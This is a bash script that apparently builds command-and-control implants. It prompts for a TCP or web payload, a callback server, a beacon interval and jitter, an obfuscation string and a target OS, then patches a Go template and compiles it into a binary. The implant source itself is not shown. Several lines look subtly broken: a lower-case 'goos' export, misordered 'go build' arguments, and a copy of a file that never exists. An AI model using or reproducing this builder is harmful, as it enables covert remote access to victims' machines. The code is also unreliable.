#!/bin/bash

read -p 'Payload(tcp|web): ' payloadvar
read -p 'Server(include "http" and ":port"): ' servervar
read -p 'Interval(seconds): ' intervalvar
read -p 'Delta(seconds): ' deltavar
read -p 'Obfuscation text(random string): ' obftextvar
read -p 'Target OS(linux|windows): ' targetos
read -p 'Output binary name: ' outputbin

echo "[+] Replacing variables..."
if [ $payloadvar == "tcp" ]
then
    payloadpath="petrie/petrie.go"
 
elif [ $payloadvar == "web" ]
then
    payloadpath="little_foot/little_foot.go"
 
else
    echo "unknown payload type"
    exit
fi
echo "[+] Copying files..."

cp $payloadpath tmp1.go

sed -i "s/&&SERV&&/${servervar}/g" tmp1.go
sed -i "s/&&INTERVAL&&/${intervalvar}/g" tmp1.go
sed -i "s/&&DELTA&&/${deltavar}/g" tmp1.go
sed -i "s/&&OBFTEXT&&/${obftextvar}/g" tmp1.go

echo "[+] Fetching package"

go get -u github.com/degenerat3/metcli

echo "[+] Building binary"

export goos=$targetos

go build tmp1.go -o $outputbin

echo "[+] Cleaning up..."
cp tmp1 $outputbin
rm tmp1.go